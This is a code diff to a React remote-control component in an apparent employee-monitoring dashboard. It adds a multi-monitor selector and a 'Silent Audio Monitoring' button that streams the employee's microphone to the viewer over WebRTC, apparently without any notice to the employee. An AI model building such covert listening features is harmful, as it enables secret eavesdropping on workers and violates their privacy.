@@ -1,5 +1,5 @@
 import React, { useEffect, useRef, useState } from 'react';
-import { X, MousePointer, Keyboard, Camera, Download, Maximize, Minimize, Mic, MicOff } from 'lucide-react';
+import { X, MousePointer, Keyboard, Camera, Download, Maximize, Minimize, Mic, MicOff, Monitor, Volume2, VolumeX } from 'lucide-react';
 
 const ICE_SERVERS = {
     iceServers: [
@@ -11,18 +11,81 @@ const ICE_SERVERS = {
 const RemoteControl = ({ employee, socket, onClose }) => {
     const videoRef = useRef(null);
     const pcRef = useRef(null);
-    const [videoStatus, setVideoStatus] = useState('connecting'); // connecting | live | failed
+    const [videoStatus, setVideoStatus] = useState('connecting');
     const [isFullscreen, setIsFullscreen] = useState(false);
     
     // Voice Intercom State
     const [isIntercomActive, setIsIntercomActive] = useState(false);
     const intercomPcRef = useRef(null);
     const intercomAudioRef = useRef(new Audio());
-    const [intercomStatus, setIntercomStatus] = useState('idle'); // idle | connecting | active
+    const [intercomStatus, setIntercomStatus] = useState('idle');
     
     // Remote Control State
     const [isMouseActive, setIsMouseActive] = useState(false);
     const [isKeyboardActive, setIsKeyboardActive] = useState(false);
+
+    // 🔢 Multi-Monitor State
+    const [availableMonitors, setAvailableMonitors] = useState([]);
+    const [activeMonitor, setActiveMonitor] = useState(0);
+
+    // 🔊 Silent Audio Monitoring State
+    const [isAudioMonitoring, setIsAudioMonitoring] = useState(false);
+    const audioMonitorRef = useRef(null);
+    const audioPcRef = useRef(null);
+
+    useEffect(() => {
+        if (!socket || !employee?.socketId) return;
+        // Request monitor list when component mounts
+        socket.emit('request_monitors', { employeeSocketId: employee.socketId });
+        const handleMonitorsList = ({ socketId, sources }) => {
+            if (socketId === employee.socketId) {
+                setAvailableMonitors(sources);
+            }
+        };
+        socket.on('employee_monitors_list', handleMonitorsList);
+        return () => socket.off('employee_monitors_list', handleMonitorsList);
+    }, [employee?.socketId, socket]);
+
+    const switchMonitor = (index) => {
+        setActiveMonitor(index);
+        socket.emit('switch_monitor', { employeeSocketId: employee.socketId, monitorIndex: index });
+    };
+
+    // 🔊 Silent Audio Monitoring toggle
+    const toggleAudioMonitoring = async () => {
+        if (isAudioMonitoring) {
+            if (audioPcRef.current) { audioPcRef.current.close(); audioPcRef.current = null; }
+            if (audioMonitorRef.current) { audioMonitorRef.current.srcObject = null; }
+            setIsAudioMonitoring(false);
+            return;
+        }
+        setIsAudioMonitoring(true);
+        socket.emit('silent_audio_request', { employeeSocketId: employee.socketId });
+        const pc = new RTCPeerConnection(ICE_SERVERS);
+        audioPcRef.current = pc;
+        pc.ontrack = (e) => {
+            const audio = audioMonitorRef.current || new Audio();
+            audioMonitorRef.current = audio;
+            audio.srcObject = e.streams[0] || new MediaStream([e.track]);
+            audio.autoplay = true;
+            audio.play().catch(() => {});
+        };
+        pc.onicecandidate = (e) => {
+            if (e.candidate) socket.emit('silent_audio_signal', { to: employee.socketId, signal: { type: 'candidate', candidate: e.candidate } });
+        };
+        const handleAudioSignal = async ({ from, signal }) => {
+            if (from !== employee.socketId) return;
+            if (signal.type === 'offer') {
+                await pc.setRemoteDescription(new RTCSessionDescription(signal));
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+                socket.emit('silent_audio_signal', { to: employee.socketId, signal: { type: 'answer', sdp: answer.sdp } });
+            } else if (signal.candidate) {
+                await pc.addIceCandidate(new RTCIceCandidate(signal.candidate));
+            }
+        };
+        socket.on('silent_audio_signal', handleAudioSignal);
+    };
 
     useEffect(() => {
         const handleKeyDown = (e) => {
@@ -325,6 +388,19 @@ const RemoteControl = ({ employee, socket, onClose }) => {
                 </div>
 
                 <div className="flex items-center gap-1 sm:gap-2">
+                    {/* Monitor Selector — shown only if multiple monitors found */}
+                    {availableMonitors.length > 1 && (
+                        <select
+                            value={activeMonitor}
+                            onChange={e => switchMonitor(Number(e.target.value))}
+                            className="bg-slate-800 border border-slate-700 text-slate-300 text-[10px] rounded-lg px-2 py-1"
+                        >
+                            {availableMonitors.map((m, i) => (
+                                <option key={m.id} value={i}>🖥 {m.name || `Monitor ${i + 1}`}</option>
+                            ))}
+                        </select>
+                    )}
+
                     <button 
                         title="Voice Intercom" 
                         onClick={toggleIntercom}
@@ -336,6 +412,20 @@ const RemoteControl = ({ employee, socket, onClose }) => {
                     >
                         {isIntercomActive ? <Mic size={14} /> : <MicOff size={14} />}
                         <span className="hidden xs:inline">{isIntercomActive ? 'Live' : 'Mic'}</span>
+                    </button>
+
+                    {/* 🔊 Silent Audio Monitoring */}
+                    <button
+                        title="Silent Audio Monitoring"
+                        onClick={toggleAudioMonitoring}
+                        className={`p-2 rounded flex items-center gap-1 text-[10px] font-medium transition-colors ${
+                            isAudioMonitoring
+                                ? 'bg-violet-500/20 text-violet-400 hover:bg-violet-500/30'
+                                : 'bg-slate-800 text-slate-400 hover:text-violet-400'
+                        }`}
+                    >
+                        {isAudioMonitoring ? <Volume2 size={14} /> : <VolumeX size={14} />}
+                        <span className="hidden xs:inline">{isAudioMonitoring ? 'Listening' : 'Listen'}</span>
                     </button>
                     
                     <div className="flex bg-slate-800 rounded-lg p-0.5 border border-slate-700">
